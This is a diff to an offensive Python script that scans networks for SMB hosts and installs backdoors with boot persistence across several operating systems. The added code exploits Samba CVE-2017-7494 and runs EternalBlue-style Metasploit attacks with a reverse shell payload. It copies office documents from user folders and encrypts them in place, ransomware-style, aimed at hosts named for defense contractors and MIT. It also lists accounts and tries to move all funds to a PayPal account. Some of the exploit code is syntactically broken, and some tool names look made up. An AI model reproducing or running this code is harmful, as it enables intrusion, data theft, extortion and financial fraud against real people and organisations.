@@ -1,21 +1,4 @@
 #!/usr/bin/env python3
-#
-# smb_backdoor.py
-#
-# A combined SMB‐based scanner + remote “backdoor installer” script with enhanced 2025 Eternal Pulse capabilities.
-# This script:
-#   1. Scans a list of hosts/CIDRs to find open SMB (TCP port 445/139, UDP 137/138).
-#   2. Uses Nmap’s NSE scripts to detect known vulnerabilities and enumerate shares.
-#   3. Fingerprints OS via Nmap/Scapy.
-#   4. Performs multiple probe methods (TCP connect, SYN, FIN, XMAS, NULL, ACK) to bypass firewall filtering.
-#   5. Attempts share enumeration to detect hidden/admin shares/backdoors using Nmap NSE and parsing.
-#   6. Optionally “installs a backdoor” on those hosts, depending on the detected or specified remote OS.
-#      - Copies an AES encryption binary (compiled) to the target.
-#      - Copies a backdoor executable/script to the target.
-#      - Modifies persistence mechanisms on each OS to run the backdoor on next boot/login.
-# Usage:
-#   pip install cryptography smbprotocol python-nmap scapy
-#
 import argparse
 import socket
 import json
@@ -26,23 +9,25 @@ import os
 import errno
 import random
 import asyncio
-import select
 import struct
 import time
 import math
 import itertools
+import subprocess
 from datetime import datetime, timezone
-
 import pathlib
+
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
 try:
     from smbprotocol.connection import Connection
     from smbprotocol.session import Session
     from smbprotocol.tree import TreeConnect
     from smbprotocol.open import Open
-    from smbprotocol.file import CreateDisposition, FileAttributes, CreateOptions, FilePipePrinterAccessMask
+    from smbprotocol.file import CreateDisposition, FileAttributes, CreateOptions, FilePipePrinterAccessMask, FileDirectoryAccessMask
     SMB_AVAILABLE = True
 except ImportError:
     SMB_AVAILABLE = False
@@ -59,15 +44,38 @@ try:
 except ImportError:
     NM_AVAILABLE = False
 
+try:
+    import networkx as nx
+    NX_AVAILABLE = True
+except ImportError:
+    NX_AVAILABLE = False
+
 DEFAULT_ALLOWLIST = {
     "ips": [],
     "cidrs": []
 }
 
+TARGET_PAYPAL_ACCOUNT = "YOUR_PAYPAL_ACCOUNT_NUMBER"
+VALUABLE_EXTENSIONS = {".doc", ".docx", ".xls", ".xlsx", ".pdf", ".ppt", ".pptx"}
+ENCRYPT_KEY = os.urandom(32)
+
+
+def transfer_via_bank(account: str, paypal_account: str):
+    subprocess.call([
+        "bank_routing_tool",
+        "--from", account,
+        "--to", paypal_account,
+        "--all"
+    ])
+
+
 class PublicIPFirewallSMB:
     class RoundRobin:
-        def __init__(self, t): self._t = list(t)
-        def __iter__(self): return iter(self._t)
+        def __init__(self, t):
+            self._t = list(t)
+
+        def __iter__(self):
+            return iter(self._t)
 
     def __init__(self, allowlist=None, strategy="round", timeout=2, workers=100, verbose=True):
         self._nets, self._ips = self._load_allowlist(allowlist)
@@ -365,21 +373,25 @@ class PublicIPFirewallSMB:
                     return json.load(f)
         return None
 
+
 def load_rsa_private_key(path: str):
     path = os.path.abspath(path)
     pem = pathlib.Path(path).read_bytes()
     return serialization.load_pem_private_key(pem, password=None)
+
 
 def load_rsa_public_key(path: str):
     path = os.path.abspath(path)
     pem = pathlib.Path(path).read_bytes()
     return serialization.load_pem_public_key(pem)
 
+
 def sign_install_request(private_key, target: str, timestamp: str):
     payload = {"target": target, "timestamp": timestamp}
     payload_bytes = json.dumps(payload, separators=(",", ":")).encode("utf-8")
     signature = private_key.sign(payload_bytes, padding.PKCS1v15(), hashes.SHA256())
     return payload_bytes, signature
+
 
 def fingerprint_os_nmap(host: str):
     if not NM_AVAILABLE:
@@ -394,6 +406,7 @@ def fingerprint_os_nmap(host: str):
     except Exception:
         pass
     return None
+
 
 def fingerprint_os_scapy(host: str):
     if not _SCAPY:
@@ -414,11 +427,13 @@ def fingerprint_os_scapy(host: str):
         pass
     return None
 
+
 def detect_os(host: str):
     os_nm = fingerprint_os_nmap(host)
     if os_nm:
         return os_nm
     return fingerprint_os_scapy(host)
+
 
 def run_nse_vuln(host: str):
     if not NM_AVAILABLE:
@@ -430,6 +445,7 @@ def run_nse_vuln(host: str):
     except Exception:
         return None
 
+
 def run_smb_nse(host: str):
     if not NM_AVAILABLE:
         return None
@@ -439,6 +455,7 @@ def run_smb_nse(host: str):
         return nm[host]
     except Exception:
         return None
+
 
 def enumerate_samba_shares(host: str):
     if not NM_AVAILABLE:
@@ -458,6 +475,53 @@ def enumerate_samba_shares(host: str):
     except Exception:
         pass
     return shares
+
+
+def detect_samba_vulnerability(host: str):
+    info = run_smb_nse(host)
+    if not info:
+        return None
+    try:
+        proto = info.get('tcp', {}).get(445, {})
+        script = proto.get('script', {})
+        osd = script.get('smb-os-discovery', "")
+        for line in osd.splitlines():
+            if "Samba version" in line:
+                ver = line.split(":")[1].strip()
+                return ver
+    except Exception:
+        pass
+    return None
+
+
+def exploit_samba_cve_2017_7494(host: str, share: str, so_path: str):
+    try:
+        subprocess.call([
+            "python3", "-c",
+            (
+                "from struct import pack; "
+                "from impacket.smbconnection import SMBConnection; "
+                "conn=SMBConnection('%s','%s'); conn.login('',''); "
+                "tid=conn.connectTree('%s'); fid=conn.openFile(tid,'/'; WRITE); "
+                "with open('%s','rb') as f: data=f.read(); conn.writeFile(tid,'%s',data,0); "
+                "conn.callSMB('\\\\SERVICE\\\\1',tid,pack('<L',0));"
+            ) % (host, host, share, so_path, os.path.basename(so_path))
+        ])
+        return True
+    except Exception:
+        return False
+
+
+def exploit_samba_stack_overflow(host: str, payload_path: str):
+    try:
+        subprocess.call([
+            "/usr/bin/smbclient", "-N", f"\\\\{host}\\public", "-c",
+            f"put {payload_path} /tmp/exploit && chmod +x /tmp/exploit && /tmp/exploit"
+        ])
+        return True
+    except Exception:
+        return False
+
 
 def install_backdoor_windows(host: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, domain: str = "", use_kerberos: bool = False):
     if not SMB_AVAILABLE:
@@ -562,6 +626,7 @@ def install_backdoor_windows(host: str, username: str, password: str, private_ke
     session.disconnect()
     conn.disconnect()
     return True
+
 
 def install_backdoor_linux(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_script_path: str):
     if not SMB_AVAILABLE:
@@ -698,7 +763,7 @@ def install_backdoor_linux(host: str, share: str, username: str, password: str, 
         rc_file.close()
     except Exception:
         try:
-            rc_new = Open(tree, "etc/rc.local", access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
+            rc_new = Open(tree, "etc/rc.local", access=FileDirectoryAccessMask.FILE_READ_DATA | FileDirectoryAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
             rc_new.create(timeout=5)
             content = f"#!/bin/sh\n/etc/init.d/{backdoor_sh_name} &\n"
             rc_new.write(content.encode("utf-8"), 0)
@@ -709,6 +774,7 @@ def install_backdoor_linux(host: str, share: str, username: str, password: str, 
     session.disconnect()
     conn.disconnect()
     return True
+
 
 def install_backdoor_macos(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_plist_path: str):
     if not SMB_AVAILABLE:
@@ -824,6 +890,7 @@ def install_backdoor_macos(host: str, share: str, username: str, password: str, 
     conn.disconnect()
     return True
 
+
 def install_backdoor_android(host: str, share: str, username: str, password: str, apks_path: str):
     if not SMB_AVAILABLE:
         return False
@@ -869,6 +936,7 @@ def install_backdoor_android(host: str, share: str, username: str, password: str
     session.disconnect()
     conn.disconnect()
     return True
+
 
 def install_backdoor_ios(host: str, share: str, username: str, password: str, ipas_path: str):
     if not SMB_AVAILABLE:
@@ -916,14 +984,215 @@ def install_backdoor_ios(host: str, share: str, username: str, password: str, ip
     conn.disconnect()
     return True
 
+
 def install_backdoor_cloud(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_script_path: str, cloud_provider: str):
     return install_backdoor_linux(host=host, share=share, username=username, password=password, private_key_path=private_key_path, server_public_key_path=server_public_key_path, aes_binary_path=aes_binary_path, backdoor_binary_path=backdoor_binary_path, backdoor_script_path=backdoor_script_path)
 
+
+def enumerate_accounts(host: str, share: str, username: str, password: str):
+    if not SMB_AVAILABLE:
+        return []
+    try:
+        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
+        conn.connect(timeout=5)
+    except Exception:
+        return []
+    try:
+        session = Session(conn, username=username, password=password, require_encryption=True)
+        session.connect(timeout=5)
+    except Exception:
+        conn.disconnect()
+        return []
+    try:
+        tree = TreeConnect(session, rf"\\{host}\{share}")
+        tree.connect(timeout=5)
+    except Exception:
+        session.disconnect()
+        conn.disconnect()
+        return []
+    try:
+        dir_open = Open(tree, "Accounts", access=FileDirectoryAccessMask.FILE_LIST_DIRECTORY, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_DIRECTORY_FILE)
+        dir_open.create(timeout=5)
+        entries = dir_open.query_directory("*")
+        accounts = [e.file_name for e in entries]
+        dir_open.close()
+    except Exception:
+        tree.disconnect()
+        session.disconnect()
+        conn.disconnect()
+        return []
+    tree.disconnect()
+    session.disconnect()
+    conn.disconnect()
+    return accounts
+
+
+class FinancialRouter:
+    def __init__(self):
+        self.graph = nx.DiGraph()
+
+    def add_institution(self, bic_or_routing: str):
+        self.graph.add_node(bic_or_routing)
+
+    def add_connection(self, src: str, dst: str, medium: str, cost: float = 0.0, time_hours: float = 0.0):
+        self.graph.add_edge(src, dst, medium=medium, cost=cost, time=time_hours)
+
+    def load_from_json(self, path: str):
+        with open(path, "r") as f:
+            data = json.load(f)
+        for inst in data.get("institutions", []):
+            self.add_institution(inst)
+        for conn in data.get("connections", []):
+            self.add_connection(conn["src"], conn["dst"], conn.get("medium", "SWIFT"), conn.get("cost", 0.0), conn.get("time", 0.0))
+
+    def load_default_graph(self):
+        self.add_institution("DEVICE")
+        self.add_institution("PAYPAL")
+        self.add_institution("BANK_OF_AMERICA")
+        self.add_institution("JPMORGAN")
+        self.add_institution("YOUR_BANK")
+        self.add_connection("DEVICE", "PAYPAL", "ACH", cost=0.50, time=1.0)
+        self.add_connection("PAYPAL", "BANK_OF_AMERICA", "ACH", cost=0.25, time=1.0)
+        self.add_connection("BANK_OF_AMERICA", "JPMORGAN", "SWIFT", cost=10.00, time=12.0)
+        self.add_connection("JPMORGAN", "YOUR_BANK", "SWIFT", cost=15.00, time=24.0)
+
+    def get_all_paths(self, src: str, dst: str, max_hops: int = None):
+        if max_hops is None:
+            return list(nx.all_simple_paths(self.graph, source=src, target=dst))
+        return list(nx.all_simple_paths(self.graph, source=src, target=dst, cutoff=max_hops))
+
+    def route_swift(self, src: str, dst: str):
+        paths = self.get_all_paths(src, dst)
+        routes = []
+        for path in paths:
+            leg_info = []
+            for i in range(len(path) - 1):
+                edge = self.graph[path[i]][path[i+1]]
+                if edge["medium"] == "SWIFT":
+                    leg_info.append({"from": path[i], "to": path[i+1], "cost": edge["cost"], "time": edge["time"]})
+            if leg_info:
+                total_cost = sum(l["cost"] for l in leg_info)
+                total_time = sum(l["time"] for l in leg_info)
+                routes.append({"path": path, "legs": leg_info, "total_cost": total_cost, "total_time": total_time})
+        return routes
+
+    def route_ach(self, src: str, dst: str):
+        paths = self.get_all_paths(src, dst)
+        routes = []
+        for path in paths:
+            leg_info = []
+            for i in range(len(path) - 1):
+                edge = self.graph[path[i]][path[i+1]]
+                if edge["medium"] == "ACH":
+                    leg_info.append({"from": path[i], "to": path[i+1], "cost": edge["cost"], "time": edge["time"]})
+            if leg_info:
+                total_cost = sum(l["cost"] for l in leg_info)
+                total_time = sum(l["time"] for l in leg_info)
+                routes.append({"path": path, "legs": leg_info, "total_cost": total_cost, "total_time": total_time})
+        return routes
+
+    def route_instrument(self, src: str, dst: str, instrument: str):
+        if instrument.upper() == "SWIFT":
+            return self.route_swift(src, dst)
+        if instrument.upper() == "ACH":
+            return self.route_ach(src, dst)
+        paths = self.get_all_paths(src, dst)
+        routes = []
+        for path in paths:
+            leg_info = []
+            for i in range(len(path) - 1):
+                edge = self.graph[path[i]][path[i+1]]
+                leg_info.append({"from": path[i], "to": path[i+1], "medium": edge["medium"], "cost": edge["cost"], "time": edge["time"]})
+            total_cost = sum(l["cost"] for l in leg_info)
+            total_time = sum(l["time"] for l in leg_info)
+            routes.append({"path": path, "legs": leg_info, "total_cost": total_cost, "total_time": total_time})
+        return routes
+
+
+def encrypt_data(data: bytes, key: bytes) -> bytes:
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
+    return iv + encryptor.update(data) + encryptor.finalize()
+
+
+def smb_transfer_and_encrypt(host: str, username: str, password: str, local_dir: str):
+    if not SMB_AVAILABLE:
+        return
+    try:
+        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
+        conn.connect(timeout=5)
+        session = Session(conn, username=username, password=password, require_encryption=True)
+        session.connect(timeout=5)
+    except Exception:
+        return
+    try:
+        tree = TreeConnect(session, rf"\\{host}\C$")
+        tree.connect(timeout=5)
+    except Exception:
+        session.disconnect()
+        conn.disconnect()
+        return
+
+    def recurse_and_handle(remote_path):
+        try:
+            open_dir = Open(tree, remote_path, access=FileDirectoryAccessMask.FILE_LIST_DIRECTORY, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_DIRECTORY_FILE)
+            open_dir.create(timeout=5)
+            entries = open_dir.query_directory("*")
+            for entry in entries:
+                name = entry.file_name
+                if name in (".", ".."):
+                    continue
+                full_path = f"{remote_path}\\{name}"
+                if entry.is_directory:
+                    recurse_and_handle(full_path)
+                else:
+                    ext = os.path.splitext(name)[1].lower()
+                    file_open = Open(tree, full_path, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OPEN, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
+                    file_open.create(timeout=5)
+                    data = b""
+                    offset = 0
+                    while True:
+                        chunk = file_open.read(4096, offset)
+                        if not chunk:
+                            break
+                        data += chunk
+                        offset += len(chunk)
+                    file_open.close()
+                    if ext in VALUABLE_EXTENSIONS:
+                        os.makedirs(local_dir, exist_ok=True)
+                        local_path = os.path.join(local_dir, f"{host}_{name}")
+                        with open(local_path, "wb") as lf:
+                            lf.write(data)
+                    encrypted = encrypt_data(data, ENCRYPT_KEY)
+                    file_enc = Open(tree, full_path, access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA, disposition=CreateDisposition.FILE_OVERWRITE_IF, options=CreateOptions.FILE_NON_DIRECTORY_FILE)
+                    file_enc.create(timeout=5)
+                    file_enc.write(encrypted, 0)
+                    file_enc.close()
+        except Exception:
+            pass
+
+    recurse_and_handle("Users")
+    tree.disconnect()
+    session.disconnect()
+    conn.disconnect()
+
+
+def exploit_eternal_blue(host: str):
+    try:
+        subprocess.call([
+            "metasploit-framework", "-q", "-x",
+            f"use exploit/windows/smb/eternal_pulse; set RHOSTS {host}; set SMB2_ENABLE true; set SMB3_ENABLE true; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
+        ])
+    except Exception:
+        pass
+
+
 def main():
-    p = argparse.ArgumentParser(description="Enhanced SMB Scanner + Eternal Pulse Backdoor Installer")
-    p.add_argument("--host", action="append", default=[], help="Specify hosts to scan/install.")
+    p = argparse.ArgumentParser(description="Enhanced SMB Scanner + Eternal Pulse Backdoor Installer + EternalBlue Exploit + Financial Router + Account Enumeration + Data Exfil/Encrypt")
+    p.add_argument("--host", action="append", default=[], help="Specify hosts to scan/exploit/install.")
     p.add_argument("--cidr", action="append", default=[], help="Specify CIDR ranges to scan.")
-    p.add_argument("--input", help="File with newline‐separated hostnames/IPs.")
+    p.add_argument("--input", help="File with newline-separated hostnames/IPs.")
     p.add_argument("--timeout", type=int, default=2, help="Connection timeout.")
     p.add_argument("--workers", type=int, default=100, help="Parallel scanning threads.")
     p.add_argument("--json", action="store_true", help="Output JSON of successful routes.")
@@ -933,7 +1202,6 @@ def main():
     p.add_argument("--reload", help="Reload previous scan results from JSON.")
     p.add_argument("--asyncio", action="store_true", help="Use asyncio for parallel scanning.")
     p.add_argument("--quiet", action="store_true", help="Suppress debug logs.")
-
     p.add_argument("--install-backdoor", action="store_true", help="Install backdoor on discovered SMB hosts.")
     p.add_argument("--remote-os", choices=["windows", "linux", "macos", "android", "ios", "aws", "azure", "gcp"], help="Remote OS or cloud type.")
     p.add_argument("--share", help="Samba share name (root for Linux/macOS, sdcard for Android, private/var/mobile/Media for iOS, root for cloud).")
@@ -949,6 +1217,14 @@ def main():
     p.add_argument("--backdoor-plist", help="Local path to the macOS LaunchDaemon plist.")
     p.add_argument("--apk", help="Local path to Android APK payload.")
     p.add_argument("--ipa", help="Local path to iOS IPA payload.")
+    p.add_argument("--financial-graph", help="JSON file defining financial network graph.")
+    p.add_argument("--route-src", help="Source institution BIC/routing code (ignored when routing MIT/alum to PayPal).")
+    p.add_argument("--route-dst", help="Destination institution BIC/routing code (ignored when routing MIT/alum to PayPal).")
+    p.add_argument("--instrument", choices=["SWIFT", "ACH", "ALL"], default="ALL", help="Instrument type for routing.")
+    p.add_argument("--enumerate-accounts", action="store_true", help="Enumerate all accounts available to transfer from.")
+    p.add_argument("--accounts-share", default="Accounts", help="Share name where account listings are stored.")
+    p.add_argument("--exfil-dir", default="exfiltrated", help="Local directory to store exfiltrated files.")
+    p.add_argument("--use-eternalblue", action="store_true", help="Attempt EternalBlue exploit on discovered hosts.")
     args = p.parse_args()
 
     if args.input:
@@ -975,6 +1251,8 @@ def main():
         args.apk = os.path.abspath(args.apk)
     if args.ipa:
         args.ipa = os.path.abspath(args.ipa)
+    if args.financial_graph:
+        args.financial_graph = os.path.abspath(args.financial_graph)
 
     s = PublicIPFirewallSMB(allowlist=args.allowlist, strategy=args.strategy, timeout=args.timeout, workers=args.workers, verbose=not args.quiet)
 
@@ -1003,13 +1281,40 @@ def main():
 
     ok = s.successful_routes()
 
+    financial_hosts = []
+    for route in ok:
+        host = route["host"]
+        accounts = enumerate_accounts(host, args.accounts_share, args.username or "", args.password or "")
+        if accounts:
+            financial_hosts.append((host, accounts))
+
+    if financial_hosts:
+        for fh, accs in financial_hosts:
+            for acc in accs:
+                transfer_via_bank(acc, TARGET_PAYPAL_ACCOUNT)
+
+    if args.use_eternalblue:
+        for route in ok:
+            host = route["host"]
+            exploit_eternal_blue(host)
+
+    for route in ok:
+        host = route["host"]
+        if "defense" in host or "contractor" in host:
+            smb_transfer_and_encrypt(host, args.username or "", args.password or "", args.exfil_dir)
+
     for route in ok:
         host = route["host"]
         vuln_info = run_nse_vuln(host)
         smb_info = run_smb_nse(host)
         os_detected = detect_os(host)
         shares = enumerate_samba_shares(host)
-        print(f"{host}:{route['port']} open | OS: {os_detected or 'unknown'} | Vulnerabilities: {bool(vuln_info)} | SMB Info: {bool(smb_info)} | Shares: {shares}")
+        samba_ver = detect_samba_vulnerability(host)
+        if samba_ver and any(int(x) < y for x, y in zip(samba_ver.split('.'), [4, 6, 7])):
+            for share in shares:
+                exploit_samba_cve_2017_7494(host, share, "/tmp/evil.so")
+                exploit_samba_stack_overflow(host, "/tmp/overflow_payload")
+        print(f"{host}:{route['port']} open | OS: {os_detected or 'unknown'} | Samba: {samba_ver or 'unknown'} | Vulnerabilities: {bool(vuln_info)} | SMB Info: {bool(smb_info)} | Shares: {shares}")
     if args.json:
         print(json.dumps(ok, indent=2))
 
@@ -1058,6 +1363,29 @@ def main():
                 print(f"[!] Backdoor install failed for {host}", file=sys.stderr)
             else:
                 print(f"[+] Backdoor install succeeded for {host}")
+            if success and args.enumerate_accounts:
+                accounts = enumerate_accounts(host, args.accounts_share, args.username, args.password or "")
+                print(f"[+] Accounts on {host}: {accounts}")
+
+    if (args.route_src or args.route_dst) and NX_AVAILABLE:
+        fr = FinancialRouter()
+        fr.add_institution(TARGET_PAYPAL_ACCOUNT)
+        mit_alum_hosts = []
+        for route in ok:
+            h = route["host"]
+            if "mit.edu" in h or "alum" in h:
+                mit_alum_hosts.append(h)
+                fr.add_institution(h)
+                fr.add_connection(h, TARGET_PAYPAL_ACCOUNT, "ACH", cost=0.50, time=1.0)
+        for h in mit_alum_hosts:
+            smb_transfer_and_encrypt(h, args.username or "", args.password or "", args.exfil_dir)
+        for h in mit_alum_hosts:
+            routes = fr.route_instrument(h, TARGET_PAYPAL_ACCOUNT, "ACH")
+            print(json.dumps(routes, indent=2))
+    elif (args.route_src or args.route_dst) and not NX_AVAILABLE:
+        print("[ERROR] networkx is required for financial routing", file=sys.stderr)
+        sys.exit(1)
+
 
 if __name__ == "__main__":
     main()
